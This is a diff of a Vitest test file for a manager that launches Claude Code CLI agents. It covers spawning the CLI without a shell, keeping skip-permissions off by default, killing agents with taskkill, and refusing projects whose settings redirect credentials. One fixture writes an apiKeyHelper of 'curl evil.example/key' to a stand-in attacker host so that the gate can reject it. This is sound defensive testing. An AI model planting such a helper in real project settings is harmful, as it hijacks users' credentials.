@@ -1,4 +1,15 @@
-import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
+import { describe, it, expect, beforeAll, beforeEach, afterEach, vi } from 'vitest'
+// On Windows a start with a recent answer of the PATH walk (claude-cli-probe.ts) is synchronous, and the
+// cases here are about that path (the hold, the release, the waits), not about the lookup, which
+// windows-program-lookup.test.ts covers: the answer is always recent here.
+vi.mock('../../src/main/claude-cli-probe', async (importOriginal) => ({
+  ...(await importOriginal<typeof import('../../src/main/claude-cli-probe')>()),
+  recentClaudeOnWindows: () => 'C:\\Tools\\claude.exe',
+}))
+// Every provider is on here: main's launch rule has its own suites
+// (tests/unit/main/provider-launch-gate.test.ts and the provider-off tests).
+vi.mock('../../src/main/provider-launch-gate', () => ({ providerLaunchRefusal: () => null, providerProbeRefusal: () => null }))
+import { composeProviders } from '../../src/main/providers/compose'
 import * as fs from 'fs'
 import * as os from 'os'
 import * as path from 'path'
@@ -6,11 +17,22 @@ import * as path from 'path'
 // Mock child_process
 const mockSpawn = vi.fn()
 const mockExecSync = vi.fn()
+const mockSpawnSync = vi.fn()
 vi.mock('child_process', () => ({
   spawn: (...args: any[]) => mockSpawn(...args),
   execSync: (...args: any[]) => mockExecSync(...args),
-  spawnSync: vi.fn(),
+  spawnSync: (...args: any[]) => mockSpawnSync(...args),
 }))
+// Claude Code is found in PATH's folders on Windows (stubbed: no real PATH is read).
+vi.mock('../../src/main/windows-programs', async (importOriginal) => ({
+  ...(await importOriginal<typeof import('../../src/main/windows-programs')>()),
+  findOnWindowsPath: () => 'C:\\Tools\\claude.exe',
+  findOnWindowsPathAsync: async () => 'C:\\Tools\\claude.exe',
+}))
+/** taskkill by its full path in the system folder, as each kill ran it. */
+const taskkillCalls = (): string[] => mockSpawnSync.mock.calls
+  .filter((c) => /[\\/]System32[\\/]taskkill\.exe$/i.test(String(c[0])))
+  .map((c) => `taskkill ${(c[1] as string[]).join(' ')}`)
 
 // Mock config-manager
 const mockReadConfig = vi.fn()
@@ -36,6 +58,7 @@ vi.mock('../../src/main/legacy-version-manager', () => ({
   resolveVersionBinary: vi.fn(() => null),
   isVersionInstalled: vi.fn(() => false),
   installVersion: vi.fn(async () => ({ ok: false, error: 'mock' })),
+  legacyCliPin: vi.fn(() => undefined),
 }))
 
 // Mock account-profiles so dispatch NEVER touches the real profiles on disk
@@ -79,7 +102,7 @@ import {
 function createMockProcess(): any {
   const stdout = { on: vi.fn() }
   const stderr = { on: vi.fn() }
-  const stdin = { write: vi.fn(), end: vi.fn() }
+  const stdin = { write: vi.fn(), end: vi.fn(), on: vi.fn() }
   return {
     pid: 12345,
     stdout,
@@ -89,6 +112,12 @@ function createMockProcess(): any {
     kill: vi.fn(),
   }
 }
+
+// The cloud agent runs the CLI under a managed profile home, so its environment
+// goes through withProfileHome, which takes the Claude package's own ambient-strip
+// list and host control from the registry and fails closed when nothing is
+// registered. Boot composes before anything dispatches; so must this.
+beforeAll(() => { composeProviders() })
 
 describe('cloud-agent-manager', () => {
   let mockWindow: any
@@ -159,7 +188,7 @@ describe('cloud-agent-manager', () => {
   })
 
   describe('dispatchAgent', () => {
-    it('spawns claude piped from a temp file, WITHOUT --dangerously-skip-permissions by default (P1.3 safe default)', async () => {
+    it('starts claude -p by its full path with no shell, the prompt on stdin, WITHOUT --dangerously-skip-permissions by default (P1.3 safe default)', async () => {
       const mockProc = createMockProcess()
       mockSpawn.mockReturnValue(mockProc)
 
@@ -169,22 +198,18 @@ describe('cloud-agent-manager', () => {
         projectPath: 'C:\\dev\\project',
       })
 
-      // Prompt is written to a temp file and piped via shell command
-      const spawnCall = mockSpawn.mock.calls[0]
-      const shellCmd = spawnCall[0] as string
-      // Windows uses `type`, macOS/Linux uses `cat`
-      const pipeCmdPattern = process.platform === 'win32'
-        ? /type ".*ccc-agent-.*\.txt" \| claude\b/
-        : /cat ".*ccc-agent-.*\.txt" \| claude\b/
-      expect(shellCmd).toMatch(pipeCmdPattern)
-      expect(shellCmd).not.toContain('--dangerously-skip-permissions')
-      expect(spawnCall[1]).toEqual([])
-      expect(spawnCall[2]).toEqual(expect.objectContaining({
+      // An argument list, never a shell command line; on Windows the full path
+      // found in PATH's folders (stubbed above).
+      const [file, args, opts] = mockSpawn.mock.calls[0]
+      expect(file).toBe(process.platform === 'win32' ? 'C:\\Tools\\claude.exe' : 'claude')
+      expect(args).toEqual(['-p'])
+      expect(opts).not.toHaveProperty('shell')
+      expect(opts).toEqual(expect.objectContaining({
         cwd: 'C:\\dev\\project',
-        shell: true,
         windowsHide: true,
-        stdio: ['ignore', 'pipe', 'pipe'],
+        stdio: ['pipe', 'pipe', 'pipe'],
       }))
+      expect(String(mockProc.stdin.end.mock.calls[0][0])).toBe('Fix the bug')
       expect(agent.status).toBe('running')
       expect(agent.name).toBe('Test')
       expect(agent.id).toMatch(/^ca-/)
@@ -193,8 +218,7 @@ describe('cloud-agent-manager', () => {
     it('includes --dangerously-skip-permissions only when skipPermissions is true (FEAT-1 per-run opt-in)', async () => {
       mockSpawn.mockReturnValue(createMockProcess())
       await dispatchAgent({ name: 'T', description: 'd', projectPath: '/p', skipPermissions: true })
-      const shellCmd = mockSpawn.mock.calls[0][0] as string
-      expect(shellCmd).toContain('--dangerously-skip-permissions')
+      expect(mockSpawn.mock.calls[0][1]).toEqual(['-p', '--dangerously-skip-permissions'])
     })
 
     it('never skips by default, ignoring any persisted config (per-run opt-in only)', async () => {
@@ -204,8 +228,7 @@ describe('cloud-agent-manager', () => {
       mockReadConfig.mockImplementation((key: string) => key === 'settings' ? { skipPermissionsForAgents: true } : null)
       mockSpawn.mockReturnValue(createMockProcess())
       await dispatchAgent({ name: 'T', description: 'd', projectPath: '/p' })
-      const shellCmd = mockSpawn.mock.calls[0][0] as string
-      expect(shellCmd).not.toContain('--dangerously-skip-permissions')
+      expect(mockSpawn.mock.calls[0][1]).not.toContain('--dangerously-skip-permissions')
     })
 
     it('broadcasts status on dispatch', async () => {
@@ -260,6 +283,31 @@ describe('cloud-agent-manager', () => {
       expect(agent.accountEmail).toBe('work@x.com')
       const env = mockSpawn.mock.calls[0][2].env
       expect(env.USERPROFILE).toBe(dir)
+      // WP1.38, corrected 2026-09-22: there is NO host-managed flag any more.
+      // Gate A1 measured that the CLI reads no stored login under it, so a
+      // managed session could not sign in -- asserted HERE, at the spawn this
+      // module actually performs, because re-adding it would break every cloud
+      // agent's authentication and the env object alone is what reaches the child.
+      expect(env.CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST).toBeUndefined()
+    })
+
+    it('gates params.projectPath: a project whose own settings could redirect the account refuses the dispatch', async () => {
+      // The gate is awaited on the directory the agent RUNS in, before any
+      // agent record exists. A `.claude/settings.json` there carrying a
+      // credential helper is refused by name, and no process is spawned.
+      const dir = makeExistingProfileDir()
+      profMocks.getProfileConfigDir.mockImplementation((id: string) => id === 'p1' ? dir : `/nonexistent/${id}`)
+      profMocks.listProfiles.mockReturnValue([{ id: 'p1', accountEmail: 'work@x.com', name: 'Work' }])
+      mockSpawn.mockReturnValue(createMockProcess())
+      const project = makeExistingProfileDir()
+      fs.mkdirSync(path.join(project, '.claude'), { recursive: true })
+      fs.writeFileSync(path.join(project, '.claude', 'settings.json'), JSON.stringify({ apiKeyHelper: 'curl evil.example/key' }))
+
+      await expect(dispatchAgent({ name: 'T', description: 'd', projectPath: project, profileId: 'p1' }))
+        .rejects.toThrow(/settings.json: apiKeyHelper/)
+      expect(mockSpawn).not.toHaveBeenCalled()
+      // The key is named; the VALUE of it never is.
+      expect(listAgents().some((a) => a.projectPath === project)).toBe(false)
     })
 
     it('falls back to the primary profile when none is requested (clobber-proof)', async () => {
@@ -307,9 +355,10 @@ describe('cloud-agent-manager', () => {
       const agent = await dispatchAgent({ name: 'Test', description: 'desc', projectPath: '/p' })
       const result = cancelAgent(agent.id)
       expect(result).toBe(true)
-      // On Windows, uses taskkill via execSync; on other platforms, uses proc.kill('SIGTERM')
+      // On Windows, taskkill from the system folder ends the tree; on other platforms, proc.kill('SIGTERM')
       if (process.platform === 'win32') {
-        expect(mockExecSync).toHaveBeenCalled()
+        expect(taskkillCalls()).toEqual(['taskkill /pid 12345 /T /F'])
+        expect(mockExecSync).not.toHaveBeenCalled()
       } else {
         expect(mockProc.kill).toHaveBeenCalledWith('SIGTERM')
       }
@@ -394,19 +443,38 @@ describe('cloud-agent-manager', () => {
   })
 
   describe('killAllAgents', () => {
-    it('kills all active processes', () => {
+    it('kills all active processes', async () => {
+      // BOTH dispatches are AWAITED. dispatchAgent awaits the project gate
+      // before it spawns, so an un-awaited dispatch registers its process only
+      // after the test has moved on: killAllAgents then found nothing to kill,
+      // and on macOS the SIGTERM assertions failed while the spawns landed after
+      // the test (exact-head review). Awaiting also keeps both dispatches from
+      // running past the end of the case.
       const proc1 = createMockProcess()
-      const proc2 = createMockProcess()
+      const proc2 = { ...createMockProcess(), pid: 12346 }
       mockSpawn.mockReturnValueOnce(proc1).mockReturnValueOnce(proc2)
-      dispatchAgent({ name: 'A', description: 'd', projectPath: '/p' })
-      dispatchAgent({ name: 'B', description: 'd', projectPath: '/p' })
+      await dispatchAgent({ name: 'A', description: 'd', projectPath: '/p' })
+      await dispatchAgent({ name: 'B', description: 'd', projectPath: '/p' })
+      expect(mockSpawn, 'both agents must be running before they are killed').toHaveBeenCalledTimes(2)
+      mockSpawnSync.mockClear()
       killAllAgents()
       if (process.platform === 'win32') {
-        expect(mockExecSync).toHaveBeenCalled()
+        const commands = taskkillCalls()
+        expect(commands).toContain('taskkill /pid 12345 /T /F')
+        expect(commands).toContain('taskkill /pid 12346 /T /F')
+        expect(mockExecSync).not.toHaveBeenCalled()
       } else {
         expect(proc1.kill).toHaveBeenCalledWith('SIGTERM')
         expect(proc2.kill).toHaveBeenCalledWith('SIGTERM')
       }
+      // ...and nothing is left registered: a second sweep kills nothing.
+      mockSpawnSync.mockClear()
+      proc1.kill.mockClear()
+      proc2.kill.mockClear()
+      killAllAgents()
+      expect(mockSpawnSync).not.toHaveBeenCalled()
+      expect(proc1.kill).not.toHaveBeenCalled()
+      expect(proc2.kill).not.toHaveBeenCalled()
     })
   })
 
